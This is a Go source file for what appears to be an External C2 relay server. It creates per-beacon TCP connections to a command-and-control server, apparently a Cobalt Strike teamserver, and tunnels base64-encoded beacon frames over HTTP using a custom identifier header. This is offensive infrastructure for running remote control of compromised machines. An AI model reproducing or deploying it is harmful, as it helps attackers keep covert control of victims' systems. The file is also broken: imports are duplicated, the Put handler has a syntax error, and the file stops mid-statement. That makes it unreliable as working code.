package hansonserver

import (
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"sync"

	"externalc2/pkg/transport/revtcptransport"
	"externalc2/pkg/utils/idgen"
	"externalc2/transport/revtcptransport"
	"externalc2/utils/idgen"
)

// Shamelessly ripped from: https://github.com/ryhanson/ExternalC2/blob/master/go-external-c2/cmd/web/main.go

var idHeader = "Beercan"

// Hols contextual infromation about the running app
type App struct {
	ServerAddr string
	Manager    sync.Map
}

func (app *App) getBeacon(r *http.Request) (string, *revtcptransport.SocketChannel, error) {
	header := r.Header.Get(idHeader)
	socket, ok := app.Manager.Load(header)
	if !ok {
		return "", nil, errors.New("beacon not found")
	}
	return header, socket.(*revtcptransport.SocketChannel), nil
}

// Options grabs web channel options and creates a new channel for a beacon
func (app *App) Options(w http.ResponseWriter, r *http.Request) {
	log.Println("[+] Options: creating new beacon")
	socket, err := revtcptransport.NewSocket(app.ServerAddr)
	if err != nil {
		log.Printf("[!] Error while tryign to create the socket: %s\n", err.Error())
		return
	}
	err = socket.Connect()
	if err != nil {
		log.Printf("[!] Error while trying to conenct to the CS server: %s\n", err.Error())
		return
	}
	beaconID := idgen.GenerateComponentId()
	app.Manager.Store(beaconID, socket)
	log.Printf("[+] ID will be set to %s\n", beaconID)
	w.Header().Add("X-Id-Header", idHeader)
	w.Header().Add("X-Identifier", beaconID)
}

// Gets the socket channel's readFrame method
func (app *App) Get(w http.ResponseWriter, r *http.Request) {
	id, s, err := app.getBeacon(r)
	if err != nil {
		log.Printf("[!] error during getBeacon: %s\n", err.Error())
		return
	}
	log.Printf("[+] GET: Frame to beacon id: %s\n", id)
	buff, _, err := s.ReadFrame()
	if err != nil {
		log.Printf("[!] Error during ReadFrame: %s\n", err.Error())
		return
	}
	if s.IsConnected() {
		// TODO: Replace with encoder methods
		encoder := base64.NewEncoder(base64.StdEncoding, w)
		encoder.Write(buff)
		encoder.Close()
	} else {
		fmt.Printf("[!] Socket is no longer connected")
		w.Write([]byte(""))
	}
}

// Put calls the socket channel's SendFrame method
func (app *App) Put(w http.ResponseWriter, r *http.Request) {
	// TODO: Replace with decoder methods
	decoder := base64.NewDecoder(base64.StdEncoding, r.Body)
	id, s, err ;= app.getBeacon(r)
	if err != nil {
		log.Printf("[")
	}
}
